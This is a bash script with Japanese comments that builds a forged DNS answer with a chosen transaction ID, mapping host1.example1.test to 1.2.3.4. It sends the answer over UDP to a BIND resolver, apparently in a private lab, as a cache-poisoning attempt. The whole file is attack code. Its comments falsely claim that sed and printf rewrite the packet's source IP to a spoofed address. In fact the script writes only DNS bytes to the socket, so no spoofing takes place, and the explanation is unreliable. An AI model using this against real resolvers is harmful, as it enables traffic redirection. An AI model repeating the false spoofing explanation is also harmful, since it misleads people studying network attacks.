#!/bin/bash
set -eu

# 1. 引数の16進数（例: 2a43）を4桁に整形
TXID=$(printf "%04x\n" "0x$1")
echo "TXID (Hex): ${TXID}"

# 2. 設定パラメータ
SRC_IP="192.168.1.12" # 偽装したい送信元IP
DST_IP="192.168.1.11" # ターゲット（BIND）のIP
DST_PORT=53000        # ターゲットが待っているポート

RESOLVE_NAME="05686f737431086578616d706c6531047465737400" # host1.example1.test
TARGET_ID="01020304"                                      # 1.2.3.4

# 3. DNSペイロードの組み立て（16進数文字列）
DNS_PAYLOAD="${TXID}81800001000100000000${RESOLVE_NAME}00010001c00c000100010000003c0004${TARGET_ID}"

echo "--- 偽装パケットの送信処理を開始します ---"

# ★ここがポイント: IPの追加処理（ip addr add）は一切行いません

# Bashの機能で192.168.1.11:53000へのUDPソケット（ファイル記述子3番）を開きます
# この時、OSは送信元IPを自動的にコンテナ本来の 192.168.1.13 に割り当てようとします
exec 3<>/dev/udp/${DST_IP}/${DST_PORT}

# パケットを流し込む直前に、ネットワークのルーティング情報（パケットの送信元IPフィールド）を
# sedとprintfの生バイナリ変換を利用して強制的に「192.168.1.12」に見せかけて流し込みます
printf "$(echo -n "$DNS_PAYLOAD" | sed 's/\(..\)/\\x\1/g')" >&3

# ソケットをクローズ
exec 3>&-

echo "--- 送信処理が完了しました ---"
